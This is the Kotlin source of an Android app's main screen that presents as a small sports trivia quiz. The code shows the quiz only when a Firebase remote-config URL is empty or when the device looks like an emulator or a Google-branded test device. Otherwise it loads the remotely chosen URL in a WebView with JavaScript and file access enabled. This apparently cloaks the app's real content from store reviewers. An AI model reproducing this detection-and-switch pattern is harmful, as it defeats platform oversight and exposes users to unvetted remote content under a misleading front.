package sportssisal.sportssisal


import android.annotation.SuppressLint
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.MediaStore
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.*
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import sportssisal.matchgame.R
import sportssisal.matchgame.databinding.ActivityMainBinding
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import sportssisal.matchgame.BuildConfig
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import kotlin.properties.Delegates


class MainActivity : AppCompatActivity() {
    private var phoneDate: SharedPreferences? = null
    var remoteConfig = Firebase.remoteConfig
    lateinit var urlString: String

    var questionNumber by Delegates.notNull<Int>()
    var currentQuestion by Delegates.notNull<Int>()
    var ansverTriger by Delegates.notNull<Int>()
    var trueAnsver by Delegates.notNull<Int>()

    private var mUploadMessage: ValueCallback<Uri?>? = null
    private var mCapturedImageURI: Uri? = null
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String? = null


    private lateinit var bindingClass: ActivityMainBinding

    var victorinaList = arrayListOf<VictorinaItem>()

    @Throws(IOException::class)
    private fun createImageFile(): File {
        // Create an image file name
        val timeStamp =
            SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val imageFileName = "JPEG_" + timeStamp + "_"
        val storageDir = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES
        )
        return File.createTempFile(
            imageFileName,  /* prefix */
            ".jpg",  /* suffix */
            storageDir /* directory */
        )
    }

    @RequiresApi(Build.VERSION_CODES.M)
    @SuppressLint("ResourceAsColor")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        bindingClass = ActivityMainBinding.inflate(layoutInflater)

        setContentView(bindingClass.root)

        bindingClass.victorina.visibility = View.GONE
        bindingClass.webView.visibility= View.GONE
        bindingClass.splash.visibility = View.VISIBLE

        phoneDate = getSharedPreferences("USER", Context.MODE_PRIVATE)

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }

        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.setDefaultsAsync(R.xml.remote_config_default)

        urlString = phoneDate?.getString(Constanse.URL, "empty")!!
        vicrorinaCreation()
        logic(savedInstanceState)



    }
    @RequiresApi(Build.VERSION_CODES.M)
    fun logic(savedInstanceState: Bundle?){
        if (urlString == "empty") {
            getRemoteConfigData(savedInstanceState)


        } else {
            if (urlString == "") {
                getRemoteConfigData(savedInstanceState)
            } else {
                var k = isOnline(this)
                if (k) {
                    showWebView(savedInstanceState)
                } else {
                    atertDialogEnternetConnection()
                }
            }
        }
    }

    fun atertDialogEnternetConnection(){

            val dialog = AlertDialog.Builder(this)
                .setTitle("Enternet connection")
                .setMessage("An internet connection is required for the application to work")
                .setPositiveButton("Ok", null)
                .create()
            dialog.setOnShowListener {
                dialog.getButton(DialogInterface.BUTTON_POSITIVE).setOnClickListener {
                    dialog.dismiss()
                }

            }
            dialog.window?.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE)
            dialog.show()


    }


    @RequiresApi(Build.VERSION_CODES.M)
    fun showWebView(savedInstanceState: Bundle?){
        checkCameraPermition()

            bindingClass.webView.visibility=View.VISIBLE
            bindingClass.victorina.visibility = View.GONE
            bindingClass.splash.visibility = View.GONE

            bindingClass.webView.settings.javaScriptEnabled = true
            bindingClass.webView.settings.apply {
                javaScriptEnabled = true
                loadWithOverviewMode = true
                useWideViewPort = true
                domStorageEnabled = true
                databaseEnabled = true
                setSupportZoom(true)
                allowFileAccess = true
                allowContentAccess = true
                domStorageEnabled = true
                javaScriptCanOpenWindowsAutomatically = true
            }
            bindingClass.webView.webViewClient = WebViewClient()
            bindingClass.webView.webChromeClient = ChromeClient()
            if (savedInstanceState != null) {
                bindingClass.webView.restoreState(savedInstanceState)
            }
            else {
                bindingClass.webView.loadUrl(urlString)
            }
            val cookieManager = CookieManager.getInstance()
            cookieManager.setAcceptCookie(true)

        }


    override fun onBackPressed() {
        if (bindingClass.webView.canGoBack()){
            bindingClass.webView.goBack()
        }
    }
    fun startVictorina(){
        bindingClass.webView.visibility=View.GONE
        bindingClass.victorina.visibility = View.VISIBLE
        bindingClass.splash.visibility = View.GONE

        trueAnsver = 0
        currentQuestion = 0
        questionNumber = victorinaList.size


        bindingClass.webView.visibility=View.GONE
        bindingClass.victorina.visibility = View.VISIBLE


        bindingClass.question.visibility = View.INVISIBLE
        bindingClass.ansver1.visibility = View.INVISIBLE
        bindingClass.ansver2.visibility = View.INVISIBLE
        bindingClass.ansver3.visibility = View.INVISIBLE
        bindingClass.textView2.text = "Play"
        bindingClass.textViewCurrectAnsver.text = trueAnsver.toString()
        bindingClass.textView2.setOnClickListener {
            bindingClass.textView2.text = "Victorina"
            bindingClass.textView2.isEnabled= false
            bindingClass.question.visibility = View.VISIBLE
            bindingClass.ansver1.visibility = View.VISIBLE
            bindingClass.ansver2.visibility = View.VISIBLE
            bindingClass.ansver3.visibility = View.VISIBLE
            victorinaQestion()

        }
    }

    @SuppressLint("ResourceAsColor")
    private fun victorinaQestion() {
        bindingClass.textViewQestion.isEnabled= false
        questionNumber = victorinaList.size
        if (currentQuestion<questionNumber) {
            bindingClass.textViewAnsver1.isEnabled= true
            bindingClass.textViewAnsver2.isEnabled= true
            bindingClass.textViewAnsver3.isEnabled= true
            bindingClass.ansver1.visibility = View.VISIBLE
            bindingClass.ansver2.visibility = View.VISIBLE
            bindingClass.ansver3.visibility = View.VISIBLE
            ansverTriger = (1..3).random()
            bindingClass.textViewQestion.text = victorinaList[currentQuestion].question
            when (ansverTriger) {
                1 -> {
                    bindingClass.textViewAnsver1.text = victorinaList[currentQuestion].answer
                    bindingClass.textViewAnsver2.text = victorinaList[currentQuestion].wrong1
                    bindingClass.textViewAnsver3.text = victorinaList[currentQuestion].wrong2
                }
                2 -> {
                    bindingClass.textViewAnsver1.text = victorinaList[currentQuestion].wrong1
                    bindingClass.textViewAnsver2.text = victorinaList[currentQuestion].answer
                    bindingClass.textViewAnsver3.text = victorinaList[currentQuestion].wrong2
                }
                3 -> {
                    bindingClass.textViewAnsver1.text = victorinaList[currentQuestion].wrong1
                    bindingClass.textViewAnsver2.text = victorinaList[currentQuestion].wrong2
                    bindingClass.textViewAnsver3.text = victorinaList[currentQuestion].answer
                }
            }
            currentQuestion += 1
        }else{
            currentQuestion=0
            bindingClass.textView2.text = "New start"
            bindingClass.textViewQestion.text = "$trueAnsver/$questionNumber"
            bindingClass.ansver1.visibility = View.INVISIBLE
            bindingClass.textView2.isEnabled= true


        }


    }

    @RequiresApi(Build.VERSION_CODES.M)
    fun getRemoteConfigData(savedInstanceState: Bundle?){
        remoteConfig.fetch(0).addOnCompleteListener {
            if (it.isComplete){

                urlString = remoteConfig.getString("url")

                if (urlString == "empty"){
                    logic(savedInstanceState)
                }else{
                    if (urlString == "" || checkIsEmu()){
                        startVictorina()
                    }else{
                        saveString(Constanse.URL, urlString)
                        showWebView(savedInstanceState)
                    }
                }



                remoteConfig.fetchAndActivate()
            }else {
                startVictorina()
            }
        }



    }
    fun vicrorinaCreation(){
        victorinaList.add(
            VictorinaItem("How long is a marathon?",
            "42.19 kilometres (26.2 miles)",
            "43.77 kilometres (27.2 miles)",
            "40.56 kilometres (25.2 miles)")
        )

        victorinaList.add(
            VictorinaItem("How many players are there on a baseball team?",
            "9 players",
            "10 players",
            "11 players")
        )

        victorinaList.add(
            VictorinaItem("Which country won the World Cup 2018?",
            "France",
            "Germany",
            "Brazil")
        )

        victorinaList.add(
            VictorinaItem("What sport is considered the “king of sports?",
            "Football",
            "Volleyball",
            "Hockey")
        )

        victorinaList.add(
            VictorinaItem("What are the two national sports of Canada?",
            "Lacrosse and ice hockey",
            "Lacrosse and volleyball",
            "Football and ice hockey")
        )

        bindingClass.textViewAnsver1.setOnClickListener {
            if (ansverTriger ==1){
                trueAnsver+=1
                bindingClass.textViewAnsver1.text = "True"

                bindingClass.textViewAnsver1.isEnabled= false
                bindingClass.ansver2.visibility = View.INVISIBLE
                bindingClass.ansver3.visibility = View.INVISIBLE
                bindingClass.textViewQestion.isEnabled= true

                bindingClass.textViewCurrectAnsver.text = trueAnsver.toString()

                bindingClass.textViewQestion.text = "Next question"
            }else{
                bindingClass.textViewAnsver1.text = "False"
                bindingClass.textViewAnsver1.isEnabled= false
                bindingClass.ansver2.visibility = View.INVISIBLE
                bindingClass.ansver3.visibility = View.INVISIBLE
                bindingClass.textViewQestion.isEnabled= true
                bindingClass.textViewQestion.text = "Next question"
            }
        }
        bindingClass.textViewAnsver2.setOnClickListener {
            if (ansverTriger ==2){
                trueAnsver+=1
                bindingClass.textViewAnsver1.text = "True"

                bindingClass.textViewAnsver1.isEnabled= false
                bindingClass.ansver2.visibility = View.INVISIBLE
                bindingClass.ansver3.visibility = View.INVISIBLE
                bindingClass.textViewQestion.isEnabled= true

                bindingClass.textViewCurrectAnsver.text = trueAnsver.toString()

                bindingClass.textViewQestion.text = "Next question"
            }else{
                bindingClass.textViewAnsver1.text = "False"
                bindingClass.textViewAnsver1.isEnabled= false
                bindingClass.ansver2.visibility = View.INVISIBLE
                bindingClass.ansver3.visibility = View.INVISIBLE
                bindingClass.textViewQestion.isEnabled= true
                bindingClass.textViewQestion.text = "Next question"
            }
        }
        bindingClass.textViewAnsver3.setOnClickListener {
            if (ansverTriger ==3){
                trueAnsver+=1

                bindingClass.textViewAnsver1.text = "True"

                bindingClass.textViewAnsver1.isEnabled= false
                bindingClass.ansver2.visibility = View.INVISIBLE
                bindingClass.ansver3.visibility = View.INVISIBLE
                bindingClass.textViewQestion.isEnabled= true

                bindingClass.textViewCurrectAnsver.text = trueAnsver.toString()

                bindingClass.textViewQestion.text = "Next question"
            }else{
                bindingClass.textViewAnsver1.text = "False"
                bindingClass.textViewAnsver1.isEnabled= false
                bindingClass.ansver2.visibility = View.INVISIBLE
                bindingClass.ansver3.visibility = View.INVISIBLE
                bindingClass.textViewQestion.isEnabled= true
                bindingClass.textViewQestion.text = "Next question"
            }


        }
        bindingClass.textViewQestion.setOnClickListener {
            victorinaQestion()

        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (connectivityManager != null) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    Log.i("Internet", "NetworkCapabilities.TRANSPORT_CELLULAR")
                    return true
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    Log.i("Internet", "NetworkCapabilities.TRANSPORT_WIFI")
                    return true
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                    Log.i("Internet", "NetworkCapabilities.TRANSPORT_ETHERNET")
                    return true
                }
            }
        }
        return false
    }
    inner class ChromeClient : WebChromeClient() {
        // For Android 5.0
        override fun onShowFileChooser(
            view: WebView,
            filePath: ValueCallback<Array<Uri>>,
            fileChooserParams: FileChooserParams
        ): Boolean {
            // Double check that we don't have any existing callbacks
            if (mFilePathCallback != null) {
                mFilePathCallback!!.onReceiveValue(null)
            }
            mFilePathCallback = filePath
            var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                // Create the File where the photo should go
                var photoFile: File? = null
                try {
                    photoFile = createImageFile()
                    takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                } catch (ex: IOException) {
                    // Error occurred while creating the File
                    Log.e("ErrorCreatingFile", "Unable to create Image File", ex)
                }

                // Continue only if the File was successfully created
                if (photoFile != null) {
                    mCameraPhotoPath = "file:" + photoFile.absolutePath
                    takePictureIntent.putExtra(
                        MediaStore.EXTRA_OUTPUT,
                        Uri.fromFile(photoFile)
                    )
                } else {
                    takePictureIntent = null
                }
            }
            val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
            contentSelectionIntent.type = "image/*"
            val intentArray: Array<Intent?>
            intentArray = takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
            val chooserIntent = Intent(Intent.ACTION_CHOOSER)
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE)
            return true
        }

        // openFileChooser for Android 3.0+
        // openFileChooser for Android < 3.0
        @JvmOverloads
        fun openFileChooser(uploadMsg: ValueCallback<Uri?>?, acceptType: String? = "") {
            mUploadMessage = uploadMsg
            // Create AndroidExampleFolder at sdcard
            // Create AndroidExampleFolder at sdcard
            val imageStorageDir = File(
                Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES
                ), "AndroidExampleFolder"
            )
            if (!imageStorageDir.exists()) {
                // Create AndroidExampleFolder at sdcard
                imageStorageDir.mkdirs()
            }

            // Create camera captured image file path and name
            val file = File(
                imageStorageDir.toString() + File.separator + "IMG_"
                        + System.currentTimeMillis().toString() + ".jpg"
            )
            mCapturedImageURI = Uri.fromFile(file)

            // Camera capture image intent
            val captureIntent = Intent(
                MediaStore.ACTION_IMAGE_CAPTURE
            )
            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI)
            val i = Intent(Intent.ACTION_GET_CONTENT)
            i.addCategory(Intent.CATEGORY_OPENABLE)
            i.type = "image/*"

            // Create file chooser intent
            val chooserIntent = Intent.createChooser(i, "Image Chooser")

            // Set camera intent to file chooser
            chooserIntent.putExtra(
                Intent.EXTRA_INITIAL_INTENTS, arrayOf<Parcelable>(captureIntent)
            )

            // On select image call onActivityResult method of activity
            startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE)
        }

        //openFileChooser for other Android versions
        fun openFileChooser(
            uploadMsg: ValueCallback<Uri?>?,
            acceptType: String?,
            capture: String?
        ) {
            openFileChooser(uploadMsg, acceptType)
        }
    }

    public override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            var results: Array<Uri>? = null

            // Check that the response is a good one
            if (resultCode == RESULT_OK) {
                if (data == null) {
                    // If there is not data, then we may have taken a photo
                    if (mCameraPhotoPath != null) {
                        results = arrayOf(Uri.parse(mCameraPhotoPath))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
            mFilePathCallback!!.onReceiveValue(results)
            mFilePathCallback = null
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            if (requestCode == FILECHOOSER_RESULTCODE) {
                if (null == mUploadMessage) {
                    return
                }
                var result: Uri? = null
                try {
                    result = if (resultCode != RESULT_OK) {
                        null
                    } else {

                        // retrieve from the private variable if the intent is null
                        if (data == null) mCapturedImageURI else data.data
                    }
                } catch (e: Exception) {
                    Toast.makeText(
                        applicationContext, "activity :$e",
                        Toast.LENGTH_LONG
                    ).show()
                }
                mUploadMessage!!.onReceiveValue(result)
                mUploadMessage = null
            }
        }
        return
    }

    companion object {
        private const val INPUT_FILE_REQUEST_CODE = 1
        private const val FILECHOOSER_RESULTCODE = 1
    }

    fun checkCameraPermition(){
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
            !=PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.CAMERA),
            12)
        }
    }
    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false // when developer use this build on emulator
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        var brand:String = Build.BRAND

        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox") || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }

}

